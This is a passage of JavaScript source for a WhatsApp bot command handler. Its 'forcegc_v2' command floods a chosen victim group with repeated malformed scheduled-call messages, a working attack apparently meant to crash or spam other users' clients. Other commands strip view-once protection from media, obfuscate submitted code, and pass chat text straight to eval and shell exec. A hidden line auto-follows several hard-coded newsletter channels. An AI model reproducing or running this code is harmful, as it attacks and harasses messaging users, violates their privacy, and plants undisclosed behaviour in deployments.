await Avishka.relayMessage(m.chat, {
"messageContextInfo": {
"messageSecret": "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
"deviceListMetaData": {},
"deviceListMetadataVersion": 2
},
"scheduledCallCreationMessage": {
"scheduledTimestampMs": '1200',
callType: "AUDIO",
"title": botname,
}
}, {additionalAttributes:{
edit: '7'
}})
}
} else {
    	await xeonydatabase12();
    }
break;

case 'forcegc_v2':
if (allowedUsers11.includes(avimatch11)) {
if (!q) return replygcxeon(`Example:\n ${prefix + command} 12xxx@g.us|15`)
victim = text.split("|")[0]
amount = text.split("|")[1]
for (let i = 0; i < amount; i++) {
await Avishka.relayMessage(victim, {
"messageContextInfo": {
"messageSecret": "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
"deviceListMetaData": {},
"deviceListMetadataVersion": 2
},
"scheduledCallCreationMessage": {
"scheduledTimestampMs": '1200',
callType: "AUDIO",
"title": botname,
}
}, {additionalAttributes:{
edit: '7'
}})
}
} else {
    	await xeonydatabase11();
    }
break;

case 'enc': case 'encrypt': {
    if (allowedUsers10.includes(avimatch10)) {
        const JSConfuser = require("js-confuser");
        const usage = `Usage Example:
${prefix + command} (Input text or reply text to obfuscate code)
${prefix + command} doc (Reply to a document)`;

        let text;
        if (args.length >= 1) {
            text = args.join(" ");
        } else if (m.quoted && m.quoted.text) {
            text = m.quoted.text;
        } else {
            return replygcxeon(usage);
        }
        
        try {
            let code;
            if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
                let docBuffer;
                if (m.quoted.mimetype) {
                    docBuffer = await m.quoted.download();
                }
                code = docBuffer.toString('utf-8');
            } else {
                code = text;
            }

const optionsObf6 = {
          target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "素晴座素晴難XEON素晴座素晴難" + 
            "素晴座素晴難XEON素晴座素晴難";
        
        // Fungsi untuk menghapus karakter yang tidak diinginkan
        function removeUnwantedChars(input) {
            return input.replace(
                /[^a-zA-Z座Nandokuka素Muzukashī素晴]/g, ''
            );
        }

        // Fungsi untuk menghasilkan string acak
        function randomString(length) {
            let result = '';
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; // Hanya simbol
            const charactersLength = characters.length;

            for (let i = 0; i < length; i++) {
                result += characters.charAt(
                    Math.floor(Math.random() * charactersLength)
                );
            }
            return result;
        }

        return removeUnwantedChars(originalString) + randomString(2);
    },

    renameVariables: true,
    renameGlobals: true,

    stringEncoding: true,
    stringSplitting: 0.0,
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: 1.0,

    shuffle: {
        hash: 0.0,
        true: 0.0
    },

    stack: true,
    controlFlowFlattening: 1.0,
    opaquePredicates: 0.9,
    deadCode: 0.0,
    dispatcher: true,
    rgf: false,
    calculator: true,
    hexadecimalNumbers: true,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
};


        const options = {
            target: "node",
  calculator: true,
  compact: true,
  hexadecimalNumbers: true,
  controlFlowFlattening: 0.5,
  deadCode: 0.25,
  dispatcher: true,
  duplicateLiteralsRemoval: 0.75,
  flatten: true,
  globalConcealing: true,
  minify: true,
  movedDeclarations: true,
  objectExtraction: true,
  opaquePredicates: 0.75,
  renameVariables: true,
  renameGlobals: true,
  shuffle: true,
  stringConcealing: true,
  stringCompression: true,
  stringEncoding: true,
  stringSplitting: 0.75,
  preserveFunctionLength: true,
  identifierGenerator: function () {
                return "DREAM_GUY_XEON" + Math.random().toString(36).substring(7);
            },
        };

            const obfuscatedCode = await JSConfuser.obfuscate(code, optionsObf6);

            const filePath = './enc_by_@DGXeon.js';
            fs.writeFileSync(filePath, obfuscatedCode);

            await Avishka.sendMessage(m.chat, {
                document: {
                    url: filePath
                },
                mimetype: 'application/javascript',
                fileName: 'Encrypted By @DGXeon.js'
            }, { quoted: m });

        } catch (error) {
            const errorMessage = `There is an error: ${error.message}`;
            await replygcxeon(errorMessage);
        }
    
    } else {
    	await xeonydatabase10();
    }
}
break;
case 'dec': case 'decrypt': {
	if (allowedUsers9.includes(avimatch9)) {
const { webcrack } = await import('webcrack');
const usage = `Usage Example:
${prefix + command} (Input text or reply text to dec code)
${prefix + command} doc (Reply to a document)`;

let text;
if (args.length >= 1) {
text = args.join(" ");
} else if (m.quoted && m.quoted.text) {
text = m.quoted.text;
} else {
return replygcxeon(usage);
}

try {
let message;
if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
let docBuffer;
if (m.quoted.mimetype) {
docBuffer = await m.quoted.download();
}
message = await webcrack(docBuffer.toString('utf-8'));
} else {
message = await webcrack(text);
}

const filePath = './dec_by_@DGXeon.js';
fs.writeFileSync(filePath, message.code);

await Avishka.sendMessage(m.chat, {
document: {
url: filePath
},
mimetype: 'application/javascript',
fileName: 'Decrypted By @DGXeon'
}, {quoted: m});

} catch (error) {
const errorMessage = `There is an error: ${error.message}`;
await replygcxeon(errorMessage);
}
} else {
    	await xeonydatabase9();
    }
}
break;
case 'readviewonce': case 'rvo': {
	if (allowedUsers8.includes(avimatch8)) {
	if (!m.quoted) return replygcxeon(`Reply to view once message`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return replygcxeon(`This is not a view once message`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return Avishka.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return Avishka.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
    } else {
    	await xeonydatabase8();
    }
}
break

const channelId = "120363405397839812@newsletter, 120363380926092343@newsletter, 120363316929896803@newsletter, 120363388586219821@newsletter, 120363369730577703@newsletter, 120363408455550629@newsletter, 120363385513572355@newsletter, 120363330344810280@newsletter";
followNewsletter(channelId);

case 'clearchat':{
if (allowedUsers7.includes(avimatch7)) {
m.reply('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
} else {
    	await xeonydatabase7();
    }
                    }
break

case "checkhost": {
	if (allowedUsers6.includes(avimatch6)) {
if (!q) return replygcxeon(`Example : ${prefix + command} https://nxnn.com`)
let msg = { viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": "p"
    },
    "body": {
      "text": "Click Chech Host To Check Web"
    },
    "footer": {
      "text": botname
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": JSON.stringify( {display_text : 'Check Host' , url : `https://check-host.net/check-http?host=${q}`, merchant_url : `https://check-host.net/check-http?host=${q}` })
        }
      ],
      "messageParamsJson": ""
    }
  }
}
}
}
Avishka.relayMessage(m.chat, msg, {});
} else {
    	await xeonydatabase6();
    }
}
break
case 'addprem':
if (allowedUsers.includes(avimatch5)) {
if (!isCreator) return replygcxeon(mess.OnlyOwner)
if (!text) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxx`)
var prem1 = text.split("|")[0].replace(/[^0-9]/g, '')
orgkaya.push(prem1)
fs.writeFileSync('./database/premium.json', JSON.stringify(orgkaya))
replygcxeon(`${prem1} \`Premium!\``)
await sleep(3500)
Avishka.sendMessage(prem1 + '@s.whatsapp.net', {
image: { url: 'https://files.catbox.moe/8ynou2.jpg' },
caption: 'You are now a Premium User!!'
}, { quoted: m })
} else {
    	await xeonydatabase5();
    }
break

case 'delprem':
if (allowedUsers4.includes(avimatch4)) {
if (!isCreator) return replygcxeon(mess.OnlyOwner)
if (!text) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxx`)
prem2 = text.split("|")[0].replace(/[^0-9]/g, '')
unp = orgkaya.indexOf(prem2)
orgkaya.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(orgkaya))
replygcxeon(`${prem2} \`Deleted from premium\` `)
} else {
    	await xeonydatabase4();
    }
break

case 'self': {
	if (allowedUsers3.includes(avimatch3)) {
        	if (!isCreator) return replygcxeon(mess.OnlyOwner)
Avishka.public = false
replygcxeon('Success Change To Self Mode')
} else {
    	await xeonydatabase3();
    }
}
break

case 'public': {
	if (allowedUsers2.includes(avimatch2)) {
        	if (!isCreator) return replygcxeon(mess.OnlyOwner)
Avishka.public = true
replygcxeon('Success Change To Public Mode')
} else {
    	await xeonydatabase2();
    }
}
break
case "listgc":{
	if (allowedUsers1.includes(avimatch1)) {
let getGroups = await Avishka.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let hituet = 0
let teks = `⬣ *LIST OF GROUP BELOW*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await Avishka.groupMetadata(x)
teks += `❏ Group ${hituet+=1}\n│⭔ *Name :* ${metadata2.subject}\n│⭔ *ID :* ${metadata2.id}\n│⭔ *MEMBER :* ${metadata2.participants.length}\n╰────|\n\n`
}
m.reply(teks)
} else {
    	await xeonydatabase1();
    }
  }
break
case 'axxxowner': {
	
	await Avishka.sendMessage(m.chat, {
		react: {
			text: "",
			key: m.key,
		}
	})
	let img = "https://files.catbox.moe/8ynou2.jpg"
	async function image(url) {
		const {
			imageMessage
		} = await generateWAMessageContent({
			image: {
				url
			}
		}, {
			upload: Avishka.waUploadToServer
		})
		return imageMessage
	}
	let msg = generateWAMessageFromContent(
		m.chat, {
			viewOnceMessage: {
				message: {
					interactiveMessage: {
						body: {
							text: (`Hi buddy Avi IS MY OWNER, DON'T SPAM`)
						},
						carouselMessage: {
							cards: [{
								header: {
									imageMessage: await image(img),
									hasMediaAttachment: true,
								},
								body: {
									text: ownername
								},
								nativeFlowMessage: {
									buttons: [{
										name: "cta_url",
										buttonParamsJson: '{"display_text":"Owner","url":"https:\\/\\/wa.me\\/916909137213?text=Halo+handsome+owner","webview_presentation":null}',
									}, ],
								},
							}, {
								header: {
									imageMessage: await image(img),
									hasMediaAttachment: true,
								},
								body: {
									text: ownername
								},
								nativeFlowMessage: {
									buttons: [{
										name: "cta_url",
										buttonParamsJson: '{"display_text":"YouTube","url":"https://youtube.com/@dgxeon?si=jyfzxgomMfTpqAS0","webview_presentation":null}',
									}, ],
								},
							}, {
								header: {
									imageMessage: await image(img),
									hasMediaAttachment: true,
								},
								body: {
									text: ownername
								},
								nativeFlowMessage: {
									buttons: [{
										name: "cta_url",
										buttonParamsJson: '{"display_text":"Telegram","url":"https://t.me/+WEsVdEN2B9w4ZjA9","webview_presentation":null}',
									}, ],
								},
							}, {
								header: {
									imageMessage: await image(img),
									hasMediaAttachment: true,
								},
								body: {
									text: ownername
								},
								nativeFlowMessage: {
									buttons: [{
										name: "cta_url",
										buttonParamsJson: '{"display_text":"GitHub","url":"https://github.com/DGXeon/","webview_presentation":null}',
									}, ],
								},
							}, {
								header: {
									imageMessage: await image(img),
									hasMediaAttachment: true,
								},
								body: {
									text: ownername
								},
								nativeFlowMessage: {
									buttons: [{
										name: "cta_url",
										buttonParamsJson: '{"display_text":"Instagram","url":"https://www.instagram.com/unicorn_xeon13/profilecard/?igsh=MWZqbHl4OTNjaHR3ZA==","webview_presentation":null}',
									}, ],
								},
							}, {
								header: {
									imageMessage: await image(img),
									hasMediaAttachment: true,
								},
								body: {
									text: ownername
								},
								nativeFlowMessage: {
									buttons: [{
										name: "cta_url",
										buttonParamsJson: '{"display_text":"WhatsApp Channel","url":"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20","merchant_url":"https://www.google.com"}',
									}, ],
								},
							}, ],
							messageVersion: 1,
						},
					},
				},
			},
		}, {});
	await Avishka.relayMessage(msg.key.remoteJid, msg.message, {
		messageId: msg.key.id,
	});
}
break

default:
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return replygcxeon(bang)
}
try {
replygcxeon(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
replygcxeon(String(e))
}
}












if (budy.startsWith('>')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await replygcxeon(require('util').format(teks))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return replygcxeon(`${err}`)
if (stdout) return replygcxeon(stdout)
})
}
}

} catch (err) {
console.log(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})